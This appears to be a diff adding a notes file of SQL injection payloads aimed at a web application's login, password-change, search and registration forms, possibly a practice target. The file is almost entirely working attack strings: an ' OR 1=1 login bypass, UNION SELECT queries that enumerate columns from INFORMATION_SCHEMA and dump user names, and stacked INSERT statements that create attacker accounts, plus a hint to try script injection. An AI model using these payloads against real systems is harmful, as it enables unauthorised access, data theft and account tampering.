@@ -1,0 +1,27 @@
+﻿//login
+' OR 1=1 -- 
+
+//change password
+' OR 1=1 -- 
+' OR Username = 'admin' AND Password = 'admin' -- 
+
+
+//SEARCH IN items
+//ordering and discovering column numbers. if the order by <num> gives an error than there are no more columns
+' ORDER BY 1--'
+//gets the actual column names
+' UNION SELECT column_name, null, null, null FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'Users' --'
+//gets the actual content of columns after discovering the column names
+' UNION SELECT null, firstName, lastName, null FROM Users -- 
+
+//register
+//register a user (bypassing any validations)
+'; INSERT INTO Users (Username, Password, Mobile) VALUES ('attacker', 'password', '1234567890'); --
+
+//multiple users insert:
+a','b',1); INSERT INTO Users (Username, Password, Mobile) VALUES('user1', 'password1', '1234567890'),('user2', 'password2', '1234567891'),('user3', 'password3', '1234567892'),('user4', 'password4', '1234567893'),('user5', 'password5', '1234567894'),('user6', 'password6', '1234567895');-- 
+
+//possible deletes?
+
+//try adding a comment with some script!
+//experiment!
